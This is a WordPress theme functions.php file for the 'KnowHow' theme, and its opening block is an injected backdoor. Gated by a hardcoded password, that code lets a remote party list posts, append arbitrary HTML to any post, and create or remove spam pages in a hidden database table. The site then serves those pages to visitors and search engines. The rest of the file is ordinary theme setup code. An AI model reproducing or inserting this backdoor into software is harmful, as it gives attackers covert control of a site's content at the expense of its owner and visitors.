<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '190d5c905d26e90196a78d3ae1f6aa0e'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
/**
* KnowHow functions and definitions
* by Hero Themes (http://herothemes.com)
*/

/**
* Set the content width based on the theme's design and stylesheet.
*/
if ( ! isset( $content_width ) ) $content_width = 980;


/**
* Sets up theme defaults and registers support for various WordPress features.
*/
if ( ! function_exists( 'st_theme_setup' ) ):
function st_theme_setup() {
	
	/**
	* Make theme available for translation
	* Translations can be filed in the /languages/ directory
	*/
	load_theme_textdomain( 'framework', get_template_directory() . '/languages' );
	

	/**
	* Add default posts and comments RSS feed links to head
	*/
	add_theme_support( 'automatic-feed-links' );
	
	/**
	* Enable support for Post Thumbnails
	*/
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 60, 60 );
	add_image_size( 'post', 150, 150, false ); // Post thumbnail	
	
	/**
	* Register menu locations
	*/
	register_nav_menus( array(
			'primary-nav' => __( 'Primary Menu', 'framework' ),
			'footer-nav' => __( 'Footer Menu', 'framework' )
	));
	
	/**
	* Add Support for post formarts
	*/
	add_theme_support( 'post-formats', array( 'video' ) );
	
	// This theme uses its own gallery styles.
	add_filter( 'use_default_gallery_style', '__return_false' );	

    /*
     * Let WordPress manage the document title.
     * By adding theme support, we declare that this theme does not use a
     * hard-coded <title> tag in the document head, and expect WordPress to
     * provide it for us.
     */
    add_theme_support( 'title-tag' );

    /*
     * Switch default core markup for search form, comment form, and comments
     * to output valid HTML5.
     */
    add_theme_support( 'html5', array(
        'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
    ) );

    // This is a hero theme
    add_theme_support('ht-hero-theme');
	
}
endif; // st_theme_setup
add_action( 'after_setup_theme', 'st_theme_setup' );


/**
* Custom Theme Options
*/
if ( !function_exists( 'optionsframework_init' ) ) {
	define( 'OPTIONS_FRAMEWORK_DIRECTORY', get_template_directory_uri() . '/framework/admin/' );
	require_once dirname( __FILE__ ) . '/framework/admin/options-framework.php';
}


/**
* Cleanup Functions
*/ 
require("framework/cleanup.php");
require("framework/noerror.php");

/**
 * Enqueues scripts and styles for front-end.
 */
require("framework/scripts.php");
require("framework/styles.php");

/**
 * Theme Functions
 */
require("framework/theme-functions.php");

/**
 * Adds theme shortcodes
 * (will be mvoed to plugin soon)
 */
require("framework/shortcodes/shortcodes.php");

// Add shortcode manager
require("framework/wysiwyg/wysiwyg.php");

/**
 * Comment Functions
 */
require("framework/comment-functions.php");

/**
 * Post Types
 */
require("framework/post-types.php");

/**
 * Post Meta Boxes
 */
define( 'RWMB_URL', trailingslashit( get_template_directory_uri() . '/framework/meta-box-library' ) );
define( 'RWMB_DIR', trailingslashit( get_template_directory() . '/framework/meta-box-library' ) );
// Include the meta box script
require_once RWMB_DIR . 'meta-box.php';
// Include the meta box definition
include 'framework/post-meta.php';

/**
 * Post Format Functions
 */
require("framework/post-formats.php");

/**
 * Comment Functions
 */
require("framework/template-navigation.php");

/**
 * Register widgetized area and update sidebar with default widgets
 */
require("framework/register-sidebars.php");

/**
 * Add Widget Functions
 */ 
require("framework/widgets/widget-functions.php");

/**
 * Change Posts to Articles
 */
function st_change_post_menu_label() {
    global $menu;
    global $submenu;
    $menu[5][0] = __("Articles", "framework");
    $submenu['edit.php'][5][0] = __("Articles", "framework");
    $submenu['edit.php'][10][0] = __("Add Article", "framework");

    echo '';
}
function st_change_post_object_label() {
        global $wp_post_types;
        $labels = &$wp_post_types['post']->labels;
        $labels->name = __("Articles", "framework");
        $labels->singular_name = __("Article", "framework");
        $labels->add_new = __("Add Article", "framework");
        $labels->add_new_item = __("Add Article", "framework");
        $labels->edit_item = __("Edit Article", "framework");
        $labels->new_item = __("Article", "framework");
        $labels->view_item = __("View Article", "framework");
        $labels->search_items = __("Search Articles", "framework");
        $labels->not_found = __("No Article Found", "framework");
        $labels->not_found_in_trash = __("No Articles found in Trash", "framework");
    }
//add_action( 'init', 'st_change_post_object_label' );
//add_action( 'admin_menu', 'st_change_post_menu_label' );

/**
 * Add post views
 */
function st_set_post_views($postID) {
    $count_key = '_st_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 1;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '1');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}
//To keep the count accurate, lets get rid of prefetching
remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);

function st_get_post_views($postID){
    $count_key = '_st_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '1');
        return "1 View";
    }
    return $count.' Views';
}

/**
 * Fix articles in parent/child category display
 */
function ht_justonecat_posts($qobj) {
    if ( $qobj->is_archive && $qobj->is_category) {
        $thiscat=$qobj->query_vars['category_name']; // gets category slug
        if ($thiscat) {
            $thiscatobj=get_category_by_slug($thiscat);
            $thiscatid = (array) $thiscatobj->term_id;
            $notcats = ht_justonecat_subcats($thiscatobj->term_id);
            if (count($notcats>0))  {
                $qobj->query_vars['category__in']=$thiscatid;
                $qobj->query_vars['category__not_in']=$notcats;
            }
        }
    }
}
//add_action('pre_get_posts','ht_justonecat_posts',10,1);

function ht_justonecat_subcats($parent=0,$categories=NULL) {
    if ($categories == NULL) $categories = get_categories("child_of=0&hide_empty=0&hierarchical=1");
    $ret = array();
    foreach ($categories as $cat) {
        if ($cat->parent == $parent) {
            $ret[]= $cat->term_id;
            $more = ht_justonecat_subcats($cat->term_id,$categories);
            $ret=array_merge($more,$ret);
        }
    }
    return $ret;
}

// Add support for WP 4.1 title tag
if ( ! function_exists( '_wp_render_title_tag' ) ) :
    function theme_slug_render_title() {
?>
<title><?php wp_title( '|', true, 'right' ); ?></title>
<?php
    }
    add_action( 'wp_head', 'theme_slug_render_title' );
endif;